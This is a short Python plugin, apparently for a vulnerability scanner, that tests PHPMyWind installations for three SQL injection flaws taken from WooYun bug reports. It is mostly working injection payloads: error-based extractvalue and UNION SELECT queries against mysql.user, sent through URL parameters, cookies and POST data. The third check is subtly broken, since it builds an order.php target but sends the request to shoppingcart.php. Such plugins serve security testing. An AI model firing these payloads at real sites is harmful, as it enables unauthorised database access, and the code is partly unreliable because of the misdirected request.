#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = phpmywind_3_Sqli

def assign(service, arg):
	if service == 'phpmywind':
		return True, arg

def audit(arg):
    #No.1 refer=http://www.wooyun.org/bugs/wooyun-2010-048454
    payload = "shoppingcart.php?a=addshopingcart&typeid=1%20or%20@`\'`=1%20and%20extractvalue(1,concat(0x5c,md5(1)))%20and%20@`\\\'`"
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target);
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
        security_hole(target)
    #No.2 refer=http://www.wooyun.org/bugs/wooyun-2010-049845
    payload1 = "shoppingcart.php?a=addshopingcart&goodsid=1%20and%20@`'`%20/*!50000union*/%20select%20null,null,null,null,null,null,null,null,null,null,md5(1),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20from%20mysql.user%20where%201=1%20or%20@`'`&buynum=1&goodsattr=tpcs"
    target1 = arg + payload1
    code, head, body, errcode, final_url = curl.curl2(target1)
    payload2 = "shoppingcart.php"
    target2 = arg + payload2
    code, head, body, errcode, final_url = curl.curl2(target2)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
        security_hole('Step1: '+target1+'\nStep2: '+target2)
    #No.3 refer=http://www.wooyun.org/bugs/wooyun-2010-051687
    payload = "order.php?action=getarea"
    target = arg + payload
    cookiepayload = "shoppingcart=1&username=1"
    postpayload = "datagroup=aa&areaval=500%20and%20@`'`%20/*!50000union*/%20select%201,md5(1),3,4,5,6#@`'`&level=1"
    code, head, body, errcode, final_url = curl.curl2(target2, cookie=cookiepayload, post=postpayload)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
        security_hole(target)

if __name__ == '__main__':
	from dummy import *
	audit(assign('phpmywind', 'http://127.0.0.1/phpmywind-4.6.6/')[1])